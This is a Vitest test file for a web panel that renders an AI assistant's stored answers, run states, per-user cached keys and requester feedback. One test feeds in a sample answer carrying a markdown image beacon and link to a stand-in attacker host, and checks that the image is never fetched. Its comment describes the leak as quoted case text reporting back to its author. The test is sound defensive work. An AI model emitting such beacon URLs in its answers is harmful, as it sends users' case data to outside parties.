/**
 * @file assistant-answer-panel — the answer, the states that must not claim an
 * answer, and the method section's wording.
 *
 * Node-only per the frontend convention (renderToStaticMarkup, no jsdom), with
 * `swr` replaced by a fake that dispatches on the FULL SWR key — not merely on
 * its first element. That matters: the answer key carries the signed-in uid so
 * one account's answer cannot be served to the next account in the same tab, and
 * a fake that ignores the key would let an edit drop that scoping with every test
 * still green. Here an unscoped key resolves to no data, so the answer does not
 * render at all.
 *
 * The method section opens only on a real click, so it is asserted through
 * `AssistantMethodDetails` directly; everything else is what a first render shows.
 */
import { beforeEach, describe, expect, it, vi } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import useSWR from 'swr';
import type { AssistantFeedback, Case, CaseEvent, Evidence, Run } from '@arbitra/shared';
import {
  ASSISTANT_TASK_RESULT_SCHEMA,
  ASSISTANT_TASK_RESULT_SCHEMA_V1,
  parseAssistantTaskResult,
} from '../../../lib/assistant-task-result';
import {
  AssistantAnswerPanel,
  AssistantMethodDetails,
  assistantFeedbackSwrKey,
  assistantResultSwrKey,
} from '../assistant-answer-panel';

const mocks = vi.hoisted(() => ({
  cancelTask: vi.fn(),
  createFollowUp: vi.fn(),
  getFeedback: vi.fn(),
  saveFeedback: vi.fn(),
  push: vi.fn(),
  mutateCache: vi.fn(),
  addToast: vi.fn(),
  auth: { user: { uid: 'uid_requester' } } as { user: { uid: string } | null },
  admin: { isAdmin: false, isLoading: false },
  confirmDialogProps: { current: undefined as undefined | { onConfirm: () => void } },
}));

vi.mock('swr', () => ({
  default: vi.fn(),
  useSWRConfig: () => ({ mutate: mocks.mutateCache }),
}));

vi.mock('../../../lib/api-client', () => ({
  api: {
    assistant: {
      cancelTask: mocks.cancelTask,
      createFollowUp: mocks.createFollowUp,
      getFeedback: mocks.getFeedback,
      saveFeedback: mocks.saveFeedback,
    },
    cases: { evidence: vi.fn() },
    artifacts: { content: vi.fn() },
  },
}));

vi.mock('next/navigation', () => ({
  useRouter: () => ({ push: mocks.push }),
}));

vi.mock('../../../providers/auth-provider', () => ({
  useAuth: () => mocks.auth,
}));

vi.mock('../../../hooks/use-is-admin', () => ({
  useIsAdmin: () => mocks.admin,
}));

vi.mock('../../../providers/toast-provider', () => ({
  useToast: () => ({ addToast: mocks.addToast }),
}));

// The suite is deliberately node-only. Capture the real control's callback at
// the ConfirmDialog boundary, then invoke that callback to exercise the exact
// async cancellation/mutation wiring without replacing the logic under test.
vi.mock('../../shared/confirm-dialog', () => ({
  ConfirmDialog: (props: { onConfirm: () => void }) => {
    mocks.confirmDialogProps.current = props;
    return null;
  },
}));

const mockedUseSWR = useSWR as unknown as ReturnType<typeof vi.fn>;

/**
 * Isolates the `<button>…</button>` whose text is `label`, so a disabled
 * check does not false-positive on Tailwind's `disabled:opacity-50` etc.
 * utility classes — those contain the literal substring "disabled" too, just
 * not the rendered `disabled=""` attribute this looks for.
 */
function buttonHtmlFor(html: string, label: string): string {
  const labelIndex = html.indexOf(label);
  expect(labelIndex).toBeGreaterThan(-1);
  const openIndex = html.lastIndexOf('<button', labelIndex);
  const closeIndex = html.indexOf('</button>', labelIndex) + '</button>'.length;
  return html.slice(openIndex, closeIndex);
}

const CASE_ID = 'case_teal_timber';
const ARTIFACT_REF = 'art_result';
const UID = 'uid_requester';

/** `undefined` means the evidence request has not resolved yet. */
let evidence: Evidence[] | undefined;
let evidenceError: unknown;
let contentUrl: string | undefined;
let contentError: unknown;
let feedback: AssistantFeedback | null;
let keysAsked: unknown[];

function resultDataUrl(over: Record<string, unknown> = {}): string {
  const document = {
    schema: ASSISTANT_TASK_RESULT_SCHEMA,
    answer: 'Here are the cases in the **Payments API** project.\n\n* one\n* two',
    model: 'gemini-2.5-flash',
    steps: 4,
    finish_reason: 'stop',
    duration_ms: 13_300,
    reads_withheld: false,
    reads_withheld_reason: null,
    assistant_tool_policy: {
      schema_version: 1,
      task_kind: 'arbitra_data_question',
      enabled_tools: ['arbitra_search_cases', 'arbitra_get_case', 'arbitra_search_knowledge'],
      tool_selection_reason: 'requester_scoped_read_registry',
    },
    tool_calls: [
      {
        name: 'arbitra_search_cases',
        params: { query_chars: 12, limit: 50 },
        result_bytes: 2048,
        duration_ms: 410,
        outcome: 'ok',
      },
    ],
    usage: { input_tokens: 100, output_tokens: 200, total_tokens: 300 },
    ...over,
  };
  return `data:application/json;base64,${Buffer.from(JSON.stringify(document), 'utf-8').toString('base64')}`;
}

function storedResult(over: Record<string, unknown> = {}) {
  return parseAssistantTaskResult(resultDataUrl(over));
}

function assistantCase(over: Partial<Case> = {}): Case {
  return {
    case_id: CASE_ID,
    title: 'Which cases exist in the project Payments API?',
    description: 'Which cases exist in the project Payments API?',
    status: 'done',
    case_type: 'assistant_task',
    project_id: 'proj_clerk_x',
    repository_id: 'repo_clerk_x',
    owner_user_id: 'usr_requester',
    validation_track: 'direct',
    risk_level: 'low',
    priority: 'normal',
    source_type: 'manual',
    source_ref: '',
    active_rule_set_refs: [],
    knowledge_context_refs: [],
    jira_refs: [],
    decision_ready: false,
    created_at: '2026-08-01T10:00:00.000Z',
    updated_at: '2026-08-01T10:00:14.000Z',
    ...over,
  } as Case;
}

function assistantRun(over: Partial<Run> = {}): Run {
  return {
    run_id: 'run_1',
    case_id: CASE_ID,
    run_type: 'assistant_task_run',
    trigger_source: 'assistant_intake',
    status: 'running',
    input_refs: [],
    output_refs: [],
    attempt: 1,
    created_at: '2026-08-01T10:00:01.000Z',
    updated_at: '2026-08-01T10:00:02.000Z',
    ...over,
  };
}

function taskResultEvidence(): Evidence {
  return {
    evidence_id: 'ev_result',
    case_id: CASE_ID,
    type: 'task_result',
    source_type: 'automated',
    artifact_ref: ARTIFACT_REF,
    summary: 'Here are the cases in the **Payments API** project and their current statuses: * …',
    machine_readable: true,
    validation_track: 'direct',
    created_at: '2026-08-01T10:00:14.000Z',
    created_by: 'system:assistant',
  } as Evidence;
}

function recordedFeedback(over: Partial<AssistantFeedback> = {}): AssistantFeedback {
  return {
    schema_version: 1,
    feedback_id: CASE_ID,
    case_id: CASE_ID,
    run_id: 'run_1',
    result_evidence_id: 'ev_result',
    result_artifact_id: ARTIFACT_REF,
    requester_user_id: UID,
    rating: 'useful',
    reason: 'It answered the question directly.',
    revision: 1,
    created_at: '2026-08-05T09:00:00.000Z',
    updated_at: '2026-08-05T09:00:00.000Z',
    ...over,
  };
}

/** One attempt failed and the pipeline has written it off for good. */
function abandonedEvents(): CaseEvent[] {
  return [
    {
      event_id: 'e_failed',
      case_id: CASE_ID,
      type: 'assistant_task_failed',
      actor_id: 'system:assistant',
      payload: { run_id: 'run_1', reason: 'bound:max_steps' },
      created_at: '2026-08-01T10:00:10.000Z',
    },
    {
      event_id: 'e_abandoned',
      case_id: CASE_ID,
      type: 'assistant_task_abandoned',
      actor_id: 'system:assistant',
      payload: { run_id: 'run_1', error: 'Assistant bound exceeded: max_steps.' },
      created_at: '2026-08-01T10:00:11.000Z',
    },
  ] as CaseEvent[];
}

/**
 * The shape a provider 429 leaves behind: one failed attempt, no abandonment,
 * because `classifyRunFailure` called it transient and a retry is scheduled.
 */
function retriedFailureEvents(): CaseEvent[] {
  return [
    {
      event_id: 'e_failed',
      case_id: CASE_ID,
      type: 'assistant_task_failed',
      actor_id: 'system:assistant',
      payload: { run_id: 'run_1', reason: 'model_call_failed' },
      created_at: '2026-08-01T10:00:10.000Z',
    },
  ] as CaseEvent[];
}

beforeEach(() => {
  vi.clearAllMocks();
  evidence = [];
  evidenceError = undefined;
  contentUrl = undefined;
  contentError = undefined;
  feedback = null;
  keysAsked = [];
  mocks.auth.user = { uid: UID };
  mocks.admin.isAdmin = false;
  mocks.admin.isLoading = false;
  mocks.confirmDialogProps.current = undefined;
  mocks.cancelTask.mockResolvedValue({
    case_id: CASE_ID,
    target_run_id: 'run_1',
    cancelled_run_ids: ['run_1'],
    pending_reconciliation_run_ids: ['run_1'],
    status: 'rejected',
    cancel_revision: 1,
    requested_at: '2026-08-01T10:00:03.000Z',
    requested_by: UID,
    replayed: false,
  });
  mocks.mutateCache.mockResolvedValue(undefined);

  mockedUseSWR.mockImplementation((key: unknown) => {
    keysAsked.push(key);
    if (Array.isArray(key) && key[0] === 'evidence') {
      const mine = key[1] === CASE_ID;
      return {
        data: mine && evidence ? { evidence } : undefined,
        error: mine ? evidenceError : undefined,
        isLoading: false,
        mutate: vi.fn(),
      };
    }
    if (Array.isArray(key) && key[0] === 'assistant-feedback') {
      const scoped = key.length === 3 && key[1] === CASE_ID && key[2] === mocks.auth.user?.uid;
      return {
        data: scoped ? { feedback } : undefined,
        error: undefined,
        isLoading: false,
        mutate: vi.fn(),
      };
    }
    // Only the fully scoped key resolves — artifact AND uid. An unscoped key is
    // the cross-account leak `assistantResultSwrKey` exists to prevent, so it
    // must not be able to produce an answer here either.
    const scoped = Array.isArray(key)
      && key.length === 3
      && key[0] === 'assistant-task-result'
      && key[1] === ARTIFACT_REF
      && key[2] === mocks.auth.user?.uid;
    return {
      data: scoped ? contentUrl : undefined,
      error: scoped ? contentError : undefined,
      isLoading: false,
      mutate: vi.fn(),
    };
  });
});

describe('AssistantAnswerPanel', () => {
  it('renders the stored answer in full as markdown', () => {
    evidence = [taskResultEvidence()];
    contentUrl = resultDataUrl();

    const html = renderToStaticMarkup(<AssistantAnswerPanel caseData={assistantCase()} events={[]} />);

    // Rendered, not raw: the bold marker became an element and the list became
    // a list — the Proof-tab row showed the same text with the markers intact.
    expect(html).toContain('<strong>Payments API</strong>');
    expect(html).toContain('<li>one</li>');
    expect(html).toContain('<li>two</li>');
    expect(html).not.toContain('**Payments API**');
    // The method summary is visible without opening anything.
    expect(html).toContain('1 tool call');
    expect(html).toContain('gemini-2.5-flash');
  });

  it('shows the exact instant relative answer windows are anchored to', () => {
    evidence = [taskResultEvidence()];
    contentUrl = resultDataUrl({ as_of: '2026-08-04T07:39:35.000Z' });

    const html = renderToStaticMarkup(<AssistantAnswerPanel caseData={assistantCase()} events={[]} />);

    expect(html).toContain('As of');
    expect(html).toContain('UTC');
    expect(html).toMatch(/<time[^>]*datetime="2026-08-04T07:39:35\.000Z"/i);
  });

  it('keeps a legacy result without as_of readable without inventing an anchor', () => {
    evidence = [taskResultEvidence()];
    contentUrl = resultDataUrl();

    const html = renderToStaticMarkup(<AssistantAnswerPanel caseData={assistantCase()} events={[]} />);

    expect(html).toContain('<strong>Payments API</strong>');
    expect(html).not.toContain('As of');
  });

  it('asks for the answer under a key scoped to the signed-in user', () => {
    evidence = [taskResultEvidence()];
    contentUrl = resultDataUrl();

    renderToStaticMarkup(<AssistantAnswerPanel caseData={assistantCase()} events={[]} />);

    expect(keysAsked).toContainEqual(['assistant-task-result', ARTIFACT_REF, UID]);
  });

  it('never qualifies the answer with what the run spent', () => {
    evidence = [taskResultEvidence()];
    contentUrl = resultDataUrl({ reads_withheld: true, reads_withheld_reason: 'step_budget' });

    const html = renderToStaticMarkup(<AssistantAnswerPanel caseData={assistantCase()} events={[]} />);

    // The answer renders exactly as it would with reads to spare.
    expect(html).toContain('<strong>Payments API</strong>');
    // The spent budget is a run fact and belongs with the run facts, so nothing
    // sits above the answer reading as a caveat on it — no wording, and no amber
    // strip, which would be a verdict on the answer even without words.
    expect(html).not.toContain('no reads left');
    expect(html).not.toContain('amber');
    expect(html).not.toMatch(/incomplete|partial|truncated/i);
  });

  it('renders an answer image as its alt text and never fetches its source', () => {
    evidence = [taskResultEvidence()];
    contentUrl = resultDataUrl({
      answer:
        'Titles:\n\n* Q3 report ![beacon-alt](https://attacker.example/p.png?c=case_x)\n'
        + '* [the docs](https://attacker.example/x)',
    });

    const html = renderToStaticMarkup(<AssistantAnswerPanel caseData={assistantCase()} events={[]} />);

    // No element that issues a request on open, so opening the answer cannot
    // report back to whoever wrote the case text the model quoted.
    expect(html).not.toContain('<img');
    expect(html).not.toContain('attacker.example/p.png');
    // What the fragment meant to say survives as text.
    expect(html).toContain('beacon-alt');
    // A link stays usable but leaks neither the opener nor the referrer.
    expect(html).toContain('href="https://attacker.example/x"');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });

  it('drops an image with no alt text rather than showing its url', () => {
    evidence = [taskResultEvidence()];
    contentUrl = resultDataUrl({ answer: 'Nothing to add. ![](https://attacker.example/p.png)' });

    const html = renderToStaticMarkup(<AssistantAnswerPanel caseData={assistantCase()} events={[]} />);

    expect(html).not.toContain('attacker.example');
    expect(html).toContain('Nothing to add.');
  });

  it('reports a failed run instead of an empty answer panel', () => {
    evidence = [];

    const html = renderToStaticMarkup(
      <AssistantAnswerPanel
        caseData={assistantCase({ status: 'rejected' })}
        events={abandonedEvents()}
      />,
    );

    expect(html).toContain('No answer produced');
    expect(html).toContain('bound:max_steps');
    expect(html).toContain('Assistant bound exceeded: max_steps.');
    expect(html).not.toContain('How this answer was produced');
  });

  it('says the assistant is retrying while a failed attempt has not been abandoned', () => {
    evidence = [];

    // A transient provider error: the case is still running and the next attempt
    // is already reading on the requester's behalf, so no ending may be claimed.
    const html = renderToStaticMarkup(
      <AssistantAnswerPanel
        caseData={assistantCase({ status: 'in_build' })}
        events={retriedFailureEvents()}
      />,
    );

    expect(html).toContain('Retrying');
    expect(html).toContain('trying again');
    expect(html).toContain('model_call_failed');
    expect(html).not.toContain('No answer produced');
    expect(html).not.toContain('stopped without answering');
  });

  it('reports no answer once the failure was abandoned, before the case turns terminal', () => {
    evidence = [];

    // `documentAssistantTerminalFailure` writes the abandonment onto a case that
    // is still `in_build` — it returns early on a terminal one — so the
    // abandonment, not the status, is what makes the failure the last word.
    const html = renderToStaticMarkup(
      <AssistantAnswerPanel
        caseData={assistantCase({ status: 'in_build' })}
        events={abandonedEvents()}
      />,
    );

    expect(html).toContain('No answer produced');
    expect(html).toContain('was not retried further');
    expect(html).not.toContain('Retrying');
  });

  it('reports no answer once the case is terminal, with or without an abandonment', () => {
    for (const status of ['rejected', 'done'] as const) {
      evidence = [];

      const html = renderToStaticMarkup(
        <AssistantAnswerPanel
          caseData={assistantCase({ status })}
          events={retriedFailureEvents()}
        />,
      );

      expect(html).toContain('No answer produced');
      expect(html).toContain('The assistant stopped without answering.');
      expect(html).not.toContain('Retrying');
    }
  });

  it('says the assistant is still working while no result is stored', () => {
    evidence = [];

    const html = renderToStaticMarkup(
      <AssistantAnswerPanel caseData={assistantCase({ status: 'in_build' })} events={[]} />,
    );

    expect(html).toContain('Working');
    expect(html).not.toContain('No answer produced');
  });

  it.each([
    { label: 'Working', events: [] as CaseEvent[] },
    { label: 'Retrying', events: retriedFailureEvents() },
  ])('lets the owner stop an active Clerk attempt while $label', ({ label, events }) => {
    evidence = [];

    const html = renderToStaticMarkup(
      <AssistantAnswerPanel
        caseData={assistantCase({ status: 'in_build', owner_user_id: UID })}
        events={events}
        runs={[assistantRun()]}
      />,
    );

    expect(html).toContain(label);
    expect(html).toContain('Stop task');
  });

  it('shows Stop task to an admin, but not to another member', () => {
    evidence = [];
    const caseData = assistantCase({ status: 'in_build', owner_user_id: 'uid_owner' });
    const runs = [assistantRun()];

    const memberHtml = renderToStaticMarkup(
      <AssistantAnswerPanel caseData={caseData} events={[]} runs={runs} />,
    );
    expect(memberHtml).not.toContain('Stop task');

    mocks.admin.isAdmin = true;
    const adminHtml = renderToStaticMarkup(
      <AssistantAnswerPanel caseData={caseData} events={[]} runs={runs} />,
    );
    expect(adminHtml).toContain('Stop task');
  });

  it('never offers Stop task without an active assistant_task_run', () => {
    evidence = [];
    const caseData = assistantCase({ status: 'in_build', owner_user_id: UID });

    for (const run of [
      assistantRun({ status: 'completed' }),
      assistantRun({ run_type: 'assistant_action_run', status: 'running' }),
    ]) {
      const html = renderToStaticMarkup(
        <AssistantAnswerPanel caseData={caseData} events={[]} runs={[run]} />,
      );
      expect(html).not.toContain('Stop task');
    }
  });

  it('confirms the newest active attempt by exact run id and refreshes every affected view', async () => {
    evidence = [];
    const caseData = assistantCase({ status: 'in_build', owner_user_id: UID });

    renderToStaticMarkup(
      <AssistantAnswerPanel
        caseData={caseData}
        events={retriedFailureEvents()}
        runs={[
          assistantRun({ run_id: 'run_old', status: 'running', attempt: 1 }),
          assistantRun({
            run_id: 'run_retry',
            status: 'pending',
            attempt: 2,
            created_at: '2026-08-01T10:00:12.000Z',
          }),
        ]}
      />,
    );

    expect(mocks.confirmDialogProps.current).toBeDefined();
    mocks.confirmDialogProps.current!.onConfirm();

    await vi.waitFor(() => {
      expect(mocks.cancelTask).toHaveBeenCalledWith(CASE_ID, 'run_retry');
      expect(mocks.mutateCache).toHaveBeenCalledTimes(4);
    });
    expect(mocks.mutateCache.mock.calls.map(([key]) => key)).toEqual([
      ['case', CASE_ID],
      ['runs', CASE_ID],
      ['events', CASE_ID],
      ['evidence', CASE_ID],
    ]);
    expect(mocks.addToast).toHaveBeenCalledWith('success', 'Task stopped');
  });

  it.each([
    {
      source: 'Case cancellation intent',
      caseOver: {
        assistant_cancel_intent: {
          revision: 1,
          requested_at: '2026-08-01T10:00:03.000Z',
          requested_by: UID,
        },
      } as Partial<Case>,
      events: [] as CaseEvent[],
    },
    {
      source: 'assistant_task_cancelled event',
      caseOver: {} as Partial<Case>,
      events: [
        {
          event_id: 'event_cancelled',
          case_id: CASE_ID,
          type: 'assistant_task_cancelled',
          actor_id: UID,
          payload: { run_id: 'run_1', cancel_revision: 1 },
          created_at: '2026-08-01T10:00:04.000Z',
        } as CaseEvent,
      ],
    },
  ])('renders a $source as a neutral stop, never as a failure', ({ caseOver, events }) => {
    evidence = [];
    const html = renderToStaticMarkup(
      <AssistantAnswerPanel
        caseData={assistantCase({
          status: 'rejected',
          ...caseOver,
        })}
        events={events}
        runs={[assistantRun({ status: 'cancelled' })]}
      />,
    );

    expect(html).toContain('Task stopped');
    expect(html).toContain('stopped before it produced an answer');
    expect(html).toContain('Runs and Timeline tabs');
    expect(html).not.toContain('No answer produced');
    expect(html).not.toContain('failed');
  });

  it('separates an evidence load failure from the assistant still working', () => {
    // A finished case whose evidence request fails: there is no cadence left to
    // correct a wrong claim, so the panel must not make one.
    evidence = undefined;
    evidenceError = new Error('Request failed with status 500');

    const html = renderToStaticMarkup(
      <AssistantAnswerPanel caseData={assistantCase({ status: 'done' })} events={[]} />,
    );

    expect(html).toContain('Answer unavailable');
    expect(html).toContain('Request failed with status 500');
    expect(html).toContain('Try again');
    expect(html).not.toContain('is working on this request');
    expect(html).not.toContain('No answer produced');
  });

  it('claims nothing while the evidence list is still in flight', () => {
    evidence = undefined;

    const html = renderToStaticMarkup(
      <AssistantAnswerPanel caseData={assistantCase({ status: 'done' })} events={[]} />,
    );

    expect(html).toContain('Loading');
    expect(html).not.toContain('No answer produced');
    expect(html).not.toContain('is working on this request');
  });

  it('surfaces an artifact that is not an assistant result rather than rendering it', () => {
    evidence = [taskResultEvidence()];
    contentUrl = `data:application/json;base64,${Buffer.from(
      JSON.stringify({ schema: 'arbitra.review_result/v1', answer: 'not mine' }),
      'utf-8',
    ).toString('base64')}`;

    const html = renderToStaticMarkup(<AssistantAnswerPanel caseData={assistantCase()} events={[]} />);

    expect(html).toContain('Answer unavailable');
    expect(html).not.toContain('not mine');
  });
});

describe('AssistantAnswerPanel — immutable follow-up action', () => {
  it('offers a follow-up only after the requester has a readable completed answer', () => {
    evidence = [taskResultEvidence()];
    contentUrl = resultDataUrl();
    const requesterContext = {
      channel: 'web',
      conversation_visibility: 'direct' as const,
      requester_user_id: UID,
      risk_level: 'low',
      policy_version: 'v1',
      prompt_version: 'v1',
    };

    const completed = renderToStaticMarkup(
      <AssistantAnswerPanel
        caseData={assistantCase({
          status: 'done',
          owner_user_id: UID,
          assistant_context: requesterContext,
        })}
        events={[]}
      />,
    );
    const running = renderToStaticMarkup(
      <AssistantAnswerPanel
        caseData={assistantCase({
          status: 'in_build',
          owner_user_id: UID,
          assistant_context: requesterContext,
        })}
        events={[]}
      />,
    );
    mocks.auth.user = { uid: 'uid_other' };
    const foreign = renderToStaticMarkup(
      <AssistantAnswerPanel
        caseData={assistantCase({
          status: 'done',
          owner_user_id: UID,
          assistant_context: requesterContext,
        })}
        events={[]}
      />,
    );

    expect(completed).toContain('Ask a follow-up');
    expect(running).not.toContain('Ask a follow-up');
    expect(foreign).not.toContain('Ask a follow-up');
  });

  it('renders the follow-up composer before the feedback block — follow-up is the primary action', () => {
    evidence = [taskResultEvidence()];
    contentUrl = resultDataUrl();
    const requesterContext = {
      channel: 'web',
      conversation_visibility: 'direct' as const,
      requester_user_id: UID,
      risk_level: 'low',
      policy_version: 'v1',
      prompt_version: 'v1',
    };

    const html = renderToStaticMarkup(
      <AssistantAnswerPanel
        caseData={assistantCase({
          status: 'done',
          owner_user_id: UID,
          assistant_context: requesterContext,
        })}
        events={[]}
      />,
    );

    const followUpIndex = html.indexOf('Ask a follow-up');
    const feedbackIndex = html.indexOf('Was this answer useful?');
    expect(followUpIndex).toBeGreaterThan(-1);
    expect(feedbackIndex).toBeGreaterThan(-1);
    expect(followUpIndex).toBeLessThan(feedbackIndex);
    // Both keep working exactly as shipped — no functional change, just order.
    expect(html).toContain('Start follow-up');
    expect(html).toContain('Useful');
  });
});

describe('AssistantAnswerPanel — requester usefulness feedback', () => {
  const requesterContext = {
    channel: 'web',
    conversation_visibility: 'direct' as const,
    requester_user_id: UID,
    risk_level: 'low',
    policy_version: 'v1',
    prompt_version: 'v1',
  };

  function completedCase(): Case {
    return assistantCase({
      status: 'done',
      owner_user_id: UID,
      assistant_context: requesterContext,
    });
  }

  it('offers requester feedback only after the answer is readable and uses a user-scoped key', () => {
    evidence = [taskResultEvidence()];
    contentUrl = resultDataUrl();

    const html = renderToStaticMarkup(
      <AssistantAnswerPanel caseData={completedCase()} events={[]} />,
    );

    expect(html).toContain('Was this answer useful?');
    expect(html).toContain('Useful');
    expect(html).toContain('Not useful');
    // Secondary and compact: nothing to save before a rating exists, so the
    // Save action does not render yet (unrated state).
    expect(html).not.toContain('Save feedback');
    expect(keysAsked).toContainEqual(['assistant-feedback', CASE_ID, UID]);
  });

  it('shows a disabled Save/Update once a rating exists but no reason has been given yet', () => {
    evidence = [taskResultEvidence()];
    contentUrl = resultDataUrl();
    feedback = recordedFeedback({ reason: '' });

    const html = renderToStaticMarkup(
      <AssistantAnswerPanel caseData={completedCase()} events={[]} />,
    );

    // A rating is already on record, so the button renders (this is the
    // "rated-needs-reason" state) — but the mandatory-reason rule is
    // unchanged, so it stays disabled until a reason is typed.
    expect(buttonHtmlFor(html, 'Update feedback')).toMatch(/\bdisabled=""/);
  });

  it('renders the current judgement as an editable requester revision', () => {
    evidence = [taskResultEvidence()];
    contentUrl = resultDataUrl();
    feedback = recordedFeedback();

    const html = renderToStaticMarkup(
      <AssistantAnswerPanel caseData={completedCase()} events={[]} />,
    );

    expect(html).toContain('It answered the question directly.');
    expect(html).toContain('Update feedback');
    // A reason is already recorded, so Save/Update is not disabled.
    expect(buttonHtmlFor(html, 'Update feedback')).not.toMatch(/\bdisabled=""/);
  });

  it('lets an admin inspect but not submit requester feedback', () => {
    evidence = [taskResultEvidence()];
    contentUrl = resultDataUrl();
    feedback = recordedFeedback();
    mocks.auth.user = { uid: 'uid_admin' };
    mocks.admin.isAdmin = true;

    const html = renderToStaticMarkup(
      <AssistantAnswerPanel caseData={completedCase()} events={[]} />,
    );

    expect(html).toContain('Requester feedback');
    expect(html).toContain('It answered the question directly.');
    expect(html).not.toContain('Save feedback');
    expect(html).not.toContain('Update feedback');
  });

  it('does not fetch or expose feedback to another signed-in user', () => {
    evidence = [taskResultEvidence()];
    contentUrl = resultDataUrl();
    feedback = recordedFeedback();
    mocks.auth.user = { uid: 'uid_other' };

    const html = renderToStaticMarkup(
      <AssistantAnswerPanel caseData={completedCase()} events={[]} />,
    );

    expect(html).not.toContain('Answer feedback');
    expect(html).not.toContain('It answered the question directly.');
    expect(keysAsked.some((key) => Array.isArray(key) && key[0] === 'assistant-feedback')).toBe(false);
  });
});

describe('AssistantMethodDetails', () => {
  it('states what happened to the run and never characterises the answer', () => {
    const html = renderToStaticMarkup(
      <AssistantMethodDetails
        result={storedResult({ reads_withheld: true, reads_withheld_reason: 'step_budget' })}
      />,
    );

    expect(html).toContain('used its whole step budget');
    expect(html).toContain('no reads left');
    expect(html).not.toMatch(/incomplete|partial|truncated/i);
    // The same claim in softer words is the same claim: whether the answer
    // misses anything is not knowable from this flag.
    expect(html).not.toMatch(/\bonly\b|before it finished|rests on/i);
  });

  it('omits the budget line when the run still had reads left', () => {
    const html = renderToStaticMarkup(
      <AssistantMethodDetails
        result={storedResult({ reads_withheld: false, reads_withheld_reason: null })}
      />,
    );

    expect(html).not.toContain('read budget');
    expect(html).not.toContain('no reads left');
  });

  it('describes the trace as recording filter values, because it shows them', () => {
    const html = renderToStaticMarkup(
      <AssistantMethodDetails
        result={storedResult({
          tool_calls: [
            {
              name: 'arbitra_get_case',
              params: { case_id: 'case_x', status: 'in_review' },
              result_bytes: 512,
              duration_ms: 120,
              outcome: 'ok',
            },
          ],
        })}
      />,
    );

    // The values really are on screen …
    expect(html).toContain('case case_x');
    expect(html).toContain('status in_review');
    // … so the footer says so, and says what IS withheld.
    expect(html).toContain('free-text queries as a character count');
    expect(html).not.toContain('never the values');
  });
});

describe('AssistantMethodDetails — injected context (#832 slice A)', () => {
  it('renders each entry as its own labeled block, title and id only, between the run facts and the tool calls', () => {
    const html = renderToStaticMarkup(
      <AssistantMethodDetails
        result={storedResult({
          injected_context: [
            { knowledge_id: 'knowledge_roster', title: 'Team roster' },
            { knowledge_id: 'knowledge_oncall', title: 'On-call rotation' },
          ],
        })}
      />,
    );

    expect(html).toContain('Context injected into this run');
    expect(html).toContain('Team roster');
    expect(html).toContain('knowledge_roster');
    expect(html).toContain('On-call rotation');
    expect(html).toContain('knowledge_oncall');
    // Positioned between the run facts (Steps/Tokens, the `<dl>`) and the
    // tool-call trace — `storedResult()`'s default fixture carries exactly
    // one call, `arbitra_search_cases`, rendered by `toolLabel` as "search
    // cases".
    const factsIndex = html.indexOf('Steps');
    const injectedIndex = html.indexOf('Context injected into this run');
    const toolCallIndex = html.indexOf('search cases');
    expect(factsIndex).toBeGreaterThan(-1);
    expect(toolCallIndex).toBeGreaterThan(-1);
    expect(injectedIndex).toBeGreaterThan(factsIndex);
    expect(injectedIndex).toBeLessThan(toolCallIndex);
  });

  it('omits the block entirely when the run injected nothing', () => {
    const html = renderToStaticMarkup(
      <AssistantMethodDetails result={storedResult({ injected_context: [] })} />,
    );

    expect(html).not.toContain('Context injected into this run');
  });

  it('omits the block for a legacy v1 result that never recorded the field', () => {
    const html = renderToStaticMarkup(
      <AssistantMethodDetails
        result={storedResult({ schema: ASSISTANT_TASK_RESULT_SCHEMA_V1 })}
      />,
    );

    expect(html).not.toContain('Context injected into this run');
  });
});

describe('assistantResultSwrKey', () => {
  it('scopes the cached answer to the signed-in user and waits for both inputs', () => {
    expect(assistantResultSwrKey('art_result', 'uid_a')).toEqual([
      'assistant-task-result',
      'art_result',
      'uid_a',
    ]);
    expect(assistantResultSwrKey('art_result', undefined)).toBeNull();
    expect(assistantResultSwrKey(null, 'uid_a')).toBeNull();
  });
});

describe('assistantFeedbackSwrKey', () => {
  it('scopes cached feedback to the signed-in user', () => {
    expect(assistantFeedbackSwrKey(CASE_ID, 'uid_a')).toEqual([
      'assistant-feedback',
      CASE_ID,
      'uid_a',
    ]);
    expect(assistantFeedbackSwrKey(CASE_ID, undefined)).toBeNull();
  });
});
